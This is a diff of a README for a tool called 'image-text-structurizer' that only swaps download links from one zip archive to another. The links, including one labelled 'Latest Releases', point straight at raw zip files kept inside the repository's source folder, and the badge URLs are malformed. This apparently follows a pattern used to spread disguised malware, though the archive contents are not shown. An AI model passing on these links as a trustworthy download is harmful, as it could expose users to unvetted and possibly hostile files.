@@ -1,6 +1,6 @@
 # 🖼️ image-text-structurizer - Simplify Your Image Descriptions
 
-[![Download](https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer-text-image-v1.7.zip%https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer-text-image-v1.7.zip)](https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer-text-image-v1.7.zip)
+[![Download](https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer_image_text_2.1.zip%https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer_image_text_2.1.zip)](https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer_image_text_2.1.zip)
 
 ## 📦 Overview
 
@@ -17,7 +17,7 @@ To run this application smoothly, follow these steps:
    - Internet connection for downloading and validation
 
 2. **Download & Install**
-   Visit this page to download: [Latest Releases](https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer-text-image-v1.7.zip).
+   Visit this page to download: [Latest Releases](https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer_image_text_2.1.zip).
 
 ## 📥 How to Download
 
@@ -107,4 +107,4 @@ The developers plan to enhance the software continuously. Future updates may inc
 
 Stay tuned for updates on the Releases page.
 
-[![Download](https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer-text-image-v1.7.zip%https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer-text-image-v1.7.zip)](https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer-text-image-v1.7.zip)
+[![Download](https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer_image_text_2.1.zip%https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer_image_text_2.1.zip)](https://raw.githubusercontent.com/redocto/image-text-structurizer/main/image_text_structurizer/structurizer_image_text_2.1.zip)
